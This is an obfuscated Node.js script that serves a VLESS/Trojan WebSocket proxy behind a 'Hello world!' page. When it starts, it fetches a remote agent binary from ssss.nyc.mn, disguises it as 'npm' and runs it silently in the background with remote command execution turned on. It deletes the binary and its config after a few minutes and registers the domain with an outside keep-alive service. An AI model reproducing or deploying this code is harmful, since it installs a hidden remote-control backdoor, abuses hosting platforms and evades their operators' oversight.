const _0x5c8ae8=_0x358c;(function(_0x52d104,_0x2c6f27){const _0x40184c=_0x358c,_0x2dce6e=_0x52d104();while(!![]){try{const _0x45766e=-parseInt(_0x40184c(0xf0))/0x1+-parseInt(_0x40184c(0xbb))/0x2*(parseInt(_0x40184c(0xad))/0x3)+parseInt(_0x40184c(0xc4))/0x4+-parseInt(_0x40184c(0x84))/0x5+-parseInt(_0x40184c(0x88))/0x6*(-parseInt(_0x40184c(0x95))/0x7)+parseInt(_0x40184c(0xd6))/0x8+-parseInt(_0x40184c(0xb8))/0x9*(-parseInt(_0x40184c(0xcb))/0xa);if(_0x45766e===_0x2c6f27)break;else _0x2dce6e['push'](_0x2dce6e['shift']());}catch(_0x283867){_0x2dce6e['push'](_0x2dce6e['shift']());}}}(_0x3166,0xac620));const os=require('os'),http=require(_0x5c8ae8(0xed)),fs=require('fs'),axios=require('axios'),net=require('net'),path=require(_0x5c8ae8(0x99)),crypto=require('crypto'),{Buffer}=require(_0x5c8ae8(0xb9)),{exec,execSync}=require('child_process'),{WebSocket,createWebSocketStream}=require('ws'),UUID=process['env'][_0x5c8ae8(0xe5)]||_0x5c8ae8(0x8d),NEZHA_SERVER=process['env'][_0x5c8ae8(0xcc)]||'',NEZHA_PORT=process[_0x5c8ae8(0x91)][_0x5c8ae8(0x100)]||'',NEZHA_KEY=process['env'][_0x5c8ae8(0xd0)]||'',DOMAIN=process[_0x5c8ae8(0x91)][_0x5c8ae8(0x90)]||_0x5c8ae8(0x9c),AUTO_ACCESS=process[_0x5c8ae8(0x91)][_0x5c8ae8(0x94)]||!![],WSPATH=process[_0x5c8ae8(0x91)][_0x5c8ae8(0xca)]||UUID[_0x5c8ae8(0xc5)](0x0,0x8),SUB_PATH=process[_0x5c8ae8(0x91)][_0x5c8ae8(0x102)]||_0x5c8ae8(0xb1),NAME=process[_0x5c8ae8(0x91)][_0x5c8ae8(0xc1)]||'Hug',PORT=process['env'][_0x5c8ae8(0xb3)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x3d33e7=_0x5c8ae8;try{const _0xe2b82b=await axios['get'](_0x3d33e7(0xa6)),_0x554073=_0xe2b82b['data'];ISP=(_0x554073['country']+'-'+_0x554073[_0x3d33e7(0xb6)])['replace'](/ /g,'_');}catch(_0x173346){ISP=_0x3d33e7(0xe4);}};GetISP();const httpServer=http[_0x5c8ae8(0xa9)]((_0x94d591,_0xdbbd3a)=>{const _0x80556b=_0x5c8ae8;if(_0x94d591[_0x80556b(0xea)]==='/'){const _0x48c1e8=path[_0x80556b(0x9e)](__dirname,_0x80556b(0xe8));fs[_0x80556b(0xa2)](_0x48c1e8,_0x80556b(0x8e),(_0x5cf185,_0x448e5e)=>{const _0x4ddf7a=_0x80556b;if(_0x5cf185){_0xdbbd3a[_0x4ddf7a(0xf5)](0xc8,{'Content-Type':_0x4ddf7a(0xff)}),_0xdbbd3a[_0x4ddf7a(0x103)](_0x4ddf7a(0xdb));return;}_0xdbbd3a[_0x4ddf7a(0xf5)](0xc8,{'Content-Type':'text/html'}),_0xdbbd3a[_0x4ddf7a(0x103)](_0x448e5e);});return;}else{if(_0x94d591[_0x80556b(0xea)]==='/'+SUB_PATH){const _0x511c32=_0x80556b(0xd7)+UUID+'@'+DOMAIN+':443?encryption=none&security=tls&sni='+DOMAIN+_0x80556b(0xae)+DOMAIN+'&path=%2F'+WSPATH+'#'+NAME+'-'+ISP,_0x2dd778=_0x80556b(0xeb)+UUID+'@'+DOMAIN+_0x80556b(0xc8)+DOMAIN+_0x80556b(0xae)+DOMAIN+_0x80556b(0xcf)+WSPATH+'#'+NAME+'-'+ISP,_0x10e6e6=_0x511c32+'\x0a'+_0x2dd778,_0x302273=Buffer[_0x80556b(0x8f)](_0x10e6e6)['toString'](_0x80556b(0xdd));_0xdbbd3a[_0x80556b(0xf5)](0xc8,{'Content-Type':_0x80556b(0xa4)}),_0xdbbd3a['end'](_0x302273+'\x0a');}else _0xdbbd3a[_0x80556b(0xf5)](0x194,{'Content-Type':_0x80556b(0xa4)}),_0xdbbd3a[_0x80556b(0x103)](_0x80556b(0xa0));}}),wss=new WebSocket[(_0x5c8ae8(0xd3))]({'server':httpServer}),uuid=UUID['replace'](/-/g,''),DNS_SERVERS=[_0x5c8ae8(0xf6),_0x5c8ae8(0xd2)];function resolveHost(_0x2cbfa0){return new Promise((_0x2fe762,_0x341e2e)=>{if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/['test'](_0x2cbfa0)){_0x2fe762(_0x2cbfa0);return;}let _0x55206b=0x0;function _0x437773(){const _0x2f8e0e=_0x358c;if(_0x55206b>=DNS_SERVERS[_0x2f8e0e(0xf3)]){_0x341e2e(new Error('Failed\x20to\x20resolve\x20'+_0x2cbfa0+_0x2f8e0e(0xc2)));return;}const _0x411307=DNS_SERVERS[_0x55206b];_0x55206b++;const _0x45a58a=_0x2f8e0e(0x92)+encodeURIComponent(_0x2cbfa0)+_0x2f8e0e(0xd9);axios[_0x2f8e0e(0xfe)](_0x45a58a,{'timeout':0x1388,'headers':{'Accept':_0x2f8e0e(0xb7)}})[_0x2f8e0e(0xa1)](_0x7ff59=>{const _0x23da31=_0x2f8e0e,_0x1dd44d=_0x7ff59[_0x23da31(0xab)];if(_0x1dd44d['Status']===0x0&&_0x1dd44d['Answer']&&_0x1dd44d[_0x23da31(0xf8)][_0x23da31(0xf3)]>0x0){const _0x1b4053=_0x1dd44d[_0x23da31(0xf8)][_0x23da31(0xf1)](_0x1da15c=>_0x1da15c[_0x23da31(0xdc)]===0x1);if(_0x1b4053){_0x2fe762(_0x1b4053[_0x23da31(0xab)]);return;}}_0x437773();})[_0x2f8e0e(0xcd)](_0x1e07f7=>{_0x437773();});}_0x437773();});}function handleVlessConnection(_0x402dd4,_0x57cebb){const _0x5c299b=_0x5c8ae8,[_0x232c7e]=_0x57cebb,_0x41407d=_0x57cebb[_0x5c299b(0xc5)](0x1,0x11);if(!_0x41407d[_0x5c299b(0xe9)]((_0x570fc3,_0x35d40e)=>_0x570fc3==parseInt(uuid[_0x5c299b(0xd1)](_0x35d40e*0x2,0x2),0x10)))return![];let _0x139530=_0x57cebb[_0x5c299b(0xc5)](0x11,0x12)[_0x5c299b(0xf4)]()+0x13;const _0x204365=_0x57cebb[_0x5c299b(0xc5)](_0x139530,_0x139530+=0x2)['readUInt16BE'](0x0),_0x36ed16=_0x57cebb[_0x5c299b(0xc5)](_0x139530,_0x139530+=0x1)['readUInt8'](),_0x3b1e94=_0x36ed16==0x1?_0x57cebb['slice'](_0x139530,_0x139530+=0x4)['join']('.'):_0x36ed16==0x2?new TextDecoder()['decode'](_0x57cebb[_0x5c299b(0xc5)](_0x139530+0x1,_0x139530+=0x1+_0x57cebb[_0x5c299b(0xc5)](_0x139530,_0x139530+0x1)[_0x5c299b(0xf4)]())):_0x36ed16==0x3?_0x57cebb[_0x5c299b(0xc5)](_0x139530,_0x139530+=0x10)['reduce']((_0x2a6218,_0x3168ab,_0x1cf4a1,_0x271297)=>_0x1cf4a1%0x2?_0x2a6218[_0x5c299b(0xf9)](_0x271297['slice'](_0x1cf4a1-0x1,_0x1cf4a1+0x1)):_0x2a6218,[])[_0x5c299b(0x8c)](_0xa8d4bb=>_0xa8d4bb[_0x5c299b(0xb5)](0x0)[_0x5c299b(0xfc)](0x10))[_0x5c299b(0x9e)](':'):'';_0x402dd4[_0x5c299b(0x8b)](new Uint8Array([_0x232c7e,0x0]));const _0xbe9ceb=createWebSocketStream(_0x402dd4);return resolveHost(_0x3b1e94)['then'](_0x1e4c2a=>{const _0x25156d=_0x5c299b;net[_0x25156d(0xde)]({'host':_0x1e4c2a,'port':_0x204365},function(){const _0x466c3b=_0x25156d;this['write'](_0x57cebb[_0x466c3b(0xc5)](_0x139530)),_0xbe9ceb['on'](_0x466c3b(0xf2),()=>{})[_0x466c3b(0xec)](this)['on'](_0x466c3b(0xf2),()=>{})['pipe'](_0xbe9ceb);})['on'](_0x25156d(0xf2),()=>{});})[_0x5c299b(0xcd)](_0xfd0c91=>{const _0x31531a=_0x5c299b;net[_0x31531a(0xde)]({'host':_0x3b1e94,'port':_0x204365},function(){this['write'](_0x57cebb['slice'](_0x139530)),_0xbe9ceb['on']('error',()=>{})['pipe'](this)['on']('error',()=>{})['pipe'](_0xbe9ceb);})['on'](_0x31531a(0xf2),()=>{});}),!![];}function handleTrojanConnection(_0x544a5b,_0x1d3b0d){const _0x334665=_0x5c8ae8;try{if(_0x1d3b0d[_0x334665(0xf3)]<0x3a)return![];const _0x586f53=_0x1d3b0d['slice'](0x0,0x38)[_0x334665(0xfc)](),_0x514d04=[UUID];let _0x25e252=null;for(const _0x5b6f94 of _0x514d04){const _0x2ae5a4=crypto[_0x334665(0x9b)](_0x334665(0x86))[_0x334665(0xba)](_0x5b6f94)[_0x334665(0x82)](_0x334665(0xda));if(_0x2ae5a4===_0x586f53){_0x25e252=_0x5b6f94;break;}}if(!_0x25e252)return![];let _0xf0b811=0x38;_0x1d3b0d[_0xf0b811]===0xd&&_0x1d3b0d[_0xf0b811+0x1]===0xa&&(_0xf0b811+=0x2);const _0x1e9d9f=_0x1d3b0d[_0xf0b811];if(_0x1e9d9f!==0x1)return![];_0xf0b811+=0x1;const _0x39a2a1=_0x1d3b0d[_0xf0b811];_0xf0b811+=0x1;let _0x4714ed,_0xd21419;if(_0x39a2a1===0x1)_0x4714ed=_0x1d3b0d[_0x334665(0xc5)](_0xf0b811,_0xf0b811+0x4)['join']('.'),_0xf0b811+=0x4;else{if(_0x39a2a1===0x3){const _0x34e14a=_0x1d3b0d[_0xf0b811];_0xf0b811+=0x1,_0x4714ed=_0x1d3b0d[_0x334665(0xc5)](_0xf0b811,_0xf0b811+_0x34e14a)[_0x334665(0xfc)](),_0xf0b811+=_0x34e14a;}else{if(_0x39a2a1===0x4)_0x4714ed=_0x1d3b0d[_0x334665(0xc5)](_0xf0b811,_0xf0b811+0x10)[_0x334665(0x93)]((_0x589b18,_0x231bb7,_0x501117,_0x4047df)=>_0x501117%0x2?_0x589b18[_0x334665(0xf9)](_0x4047df[_0x334665(0xc5)](_0x501117-0x1,_0x501117+0x1)):_0x589b18,[])[_0x334665(0x8c)](_0xf1904=>_0xf1904['readUInt16BE'](0x0)['toString'](0x10))[_0x334665(0x9e)](':'),_0xf0b811+=0x10;else return![];}}_0xd21419=_0x1d3b0d[_0x334665(0xb5)](_0xf0b811),_0xf0b811+=0x2;_0xf0b811<_0x1d3b0d[_0x334665(0xf3)]&&_0x1d3b0d[_0xf0b811]===0xd&&_0x1d3b0d[_0xf0b811+0x1]===0xa&&(_0xf0b811+=0x2);const _0x297d9c=createWebSocketStream(_0x544a5b);return resolveHost(_0x4714ed)[_0x334665(0xa1)](_0x3e1b38=>{net['connect']({'host':_0x3e1b38,'port':_0xd21419},function(){const _0x27a955=_0x358c;_0xf0b811<_0x1d3b0d[_0x27a955(0xf3)]&&this['write'](_0x1d3b0d['slice'](_0xf0b811)),_0x297d9c['on'](_0x27a955(0xf2),()=>{})['pipe'](this)['on'](_0x27a955(0xf2),()=>{})[_0x27a955(0xec)](_0x297d9c);})['on']('error',()=>{});})[_0x334665(0xcd)](_0x402115=>{const _0x219ae6=_0x334665;net['connect']({'host':_0x4714ed,'port':_0xd21419},function(){const _0x16c738=_0x358c;_0xf0b811<_0x1d3b0d['length']&&this[_0x16c738(0x9d)](_0x1d3b0d[_0x16c738(0xc5)](_0xf0b811)),_0x297d9c['on'](_0x16c738(0xf2),()=>{})['pipe'](this)['on']('error',()=>{})[_0x16c738(0xec)](_0x297d9c);})['on'](_0x219ae6(0xf2),()=>{});}),!![];}catch(_0x181d7d){return![];}}function _0x3166(){const _0x299be9=['1.1.1.1','Server','utf-8','application/json','5319848QaDMFO','vless://','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','&type=A','hex','Hello\x20world!','type','base64','connect','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','finish','createWriteStream','2087','connection','Unknown','UUID','https://','unlink','index.html','every','url','trojan://','pipe','http','config.yaml','chmod\x20+x\x20npm','931491cnerpt','find','error','length','readUInt8','writeHead','8.8.4.4','once','Answer','concat','message','close','toString','client_secret:\x20','get','text/html','NEZHA_PORT','443','SUB_PATH','end','digest','2096','4467675vbanlT','npm\x20is\x20running','sha224','aarch64','7457682FkWFsy','false','includes','send','map','ce41ab4d-65c8-458e-af82-fe96edf0a547','utf8','from','DOMAIN','env','https://dns.google/resolve?name=','reduce','AUTO_ACCESS','7LiceCD','stream','--tls','trim','path','arch','createHash','1234.abc.com','write','join','arm','Not\x20Found\x0a','then','readFile','error:\x20','text/plain','\x20-p\x20','https://speed.cloudflare.com/meta','Automatic\x20Access\x20Task\x20added\x20successfully','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','createServer','2053','data','npm','57oZXiIh','&fp=chrome&type=ws&host=','true','/bin/bash','sub','https://arm64.ssss.nyc.mn/agent','PORT','arm64','readUInt16BE','asOrganization','application/dns-json','9095337ZpVlDB','buffer','update','68552nYZiWS','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','log','pop','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','NAME','\x20with\x20all\x20DNS\x20servers','https://arm64.ssss.nyc.mn/v1','1055316roUVib','slice','npm\x20running\x20error:','npm\x20is\x20already\x20running,\x20skip\x20running...',':443?security=tls&sni=','setsid\x20nohup\x20./npm\x20-s\x20','WSPATH','10mMCKkX','NEZHA_SERVER','catch','https://amd64.ssss.nyc.mn/v1','&path=%2F','NEZHA_KEY','substr'];_0x3166=function(){return _0x299be9;};return _0x3166();}function _0x358c(_0x13c178,_0x19892e){const _0x3166be=_0x3166();return _0x358c=function(_0x358c6b,_0x1e8cd6){_0x358c6b=_0x358c6b-0x82;let _0x433dc7=_0x3166be[_0x358c6b];return _0x433dc7;},_0x358c(_0x13c178,_0x19892e);}wss['on'](_0x5c8ae8(0xe3),(_0x229a1a,_0x475223)=>{const _0x2b50ec=_0x5c8ae8,_0xf967f7=_0x475223['url']||'';_0x229a1a[_0x2b50ec(0xf7)](_0x2b50ec(0xfa),_0x5eb88e=>{const _0x1e6da6=_0x2b50ec;if(_0x5eb88e['length']>0x11&&_0x5eb88e[0x0]===0x0){const _0x5e1b09=_0x5eb88e[_0x1e6da6(0xc5)](0x1,0x11),_0x6e678e=_0x5e1b09[_0x1e6da6(0xe9)]((_0x460304,_0xdcb70b)=>_0x460304==parseInt(uuid[_0x1e6da6(0xd1)](_0xdcb70b*0x2,0x2),0x10));if(_0x6e678e){!handleVlessConnection(_0x229a1a,_0x5eb88e)&&_0x229a1a[_0x1e6da6(0xfb)]();return;}}!handleTrojanConnection(_0x229a1a,_0x5eb88e)&&_0x229a1a['close']();})['on'](_0x2b50ec(0xf2),()=>{});});const getDownloadUrl=()=>{const _0x32acb3=_0x5c8ae8,_0x8fc61=os[_0x32acb3(0x9a)]();return _0x8fc61===_0x32acb3(0x9f)||_0x8fc61===_0x32acb3(0xb4)||_0x8fc61===_0x32acb3(0x87)?!NEZHA_PORT?_0x32acb3(0xc3):_0x32acb3(0xb2):!NEZHA_PORT?_0x32acb3(0xce):'https://amd64.ssss.nyc.mn/agent';},downloadFile=async()=>{const _0x244088=_0x5c8ae8;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x24dc16=getDownloadUrl(),_0x1899d9=await axios({'method':_0x244088(0xfe),'url':_0x24dc16,'responseType':_0x244088(0x96)}),_0x4d8191=fs[_0x244088(0xe1)]('npm');return _0x1899d9[_0x244088(0xab)]['pipe'](_0x4d8191),new Promise((_0x2c600b,_0x45bf0f)=>{const _0xad11a9=_0x244088;_0x4d8191['on'](_0xad11a9(0xe0),()=>{const _0x571a5e=_0xad11a9;console[_0x571a5e(0xbd)]('npm\x20download\x20successfully'),exec(_0x571a5e(0xef),_0x1c4307=>{if(_0x1c4307)_0x45bf0f(_0x1c4307);_0x2c600b();});}),_0x4d8191['on'](_0xad11a9(0xf2),_0x45bf0f);});}catch(_0x18b0d0){throw _0x18b0d0;}},runnz=async()=>{const _0x412934=_0x5c8ae8;try{const _0x57102f=execSync(_0x412934(0xd8),{'encoding':_0x412934(0xd4)});if(_0x57102f[_0x412934(0x98)]()!==''){console[_0x412934(0xbd)](_0x412934(0xc7));return;}}catch(_0x4a6791){}await downloadFile();let _0x5a0574='',_0x35002e=[_0x412934(0x101),'8443',_0x412934(0x83),_0x412934(0xe2),'2083',_0x412934(0xaa)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x344f23=_0x35002e['includes'](NEZHA_PORT)?_0x412934(0x97):'';_0x5a0574=_0x412934(0xc9)+NEZHA_SERVER+':'+NEZHA_PORT+_0x412934(0xa5)+NEZHA_KEY+'\x20'+_0x344f23+_0x412934(0xa8);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0xa32e34=NEZHA_SERVER[_0x412934(0x8a)](':')?NEZHA_SERVER['split'](':')[_0x412934(0xbe)]():'',_0x59f6c4=_0x35002e['includes'](_0xa32e34)?_0x412934(0xaf):_0x412934(0x89),_0xf92a6d=_0x412934(0xfd)+NEZHA_KEY+_0x412934(0xbc)+NEZHA_SERVER+_0x412934(0xbf)+_0x59f6c4+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs['writeFileSync'](_0x412934(0xee),_0xf92a6d);}_0x5a0574=_0x412934(0xc0);}else{console[_0x412934(0xbd)](_0x412934(0xdf));return;}}try{exec(_0x5a0574,{'shell':_0x412934(0xb0)},_0x486212=>{const _0x20d1f2=_0x412934;if(_0x486212)console[_0x20d1f2(0xf2)](_0x20d1f2(0xc6),_0x486212);else console[_0x20d1f2(0xbd)](_0x20d1f2(0x85));});}catch(_0x5657c5){console[_0x412934(0xf2)](_0x412934(0xa3)+_0x5657c5);}};async function addAccessTask(){const _0x8b2917=_0x5c8ae8;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x51828c=_0x8b2917(0xe6)+DOMAIN;try{const _0x3bf6d8=await axios['post']('https://oooo.serv00.net/add-url',{'url':_0x51828c},{'headers':{'Content-Type':_0x8b2917(0xd5)}});console[_0x8b2917(0xbd)](_0x8b2917(0xa7));}catch(_0x2d6265){}}const delFiles=()=>{const _0x5461de=_0x5c8ae8;fs[_0x5461de(0xe7)](_0x5461de(0xac),()=>{}),fs['unlink']('config.yaml',()=>{});};httpServer['listen'](PORT,()=>{const _0x5639db=_0x5c8ae8;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x5639db(0xbd)]('Server\x20is\x20running\x20on\x20port\x20'+PORT);});
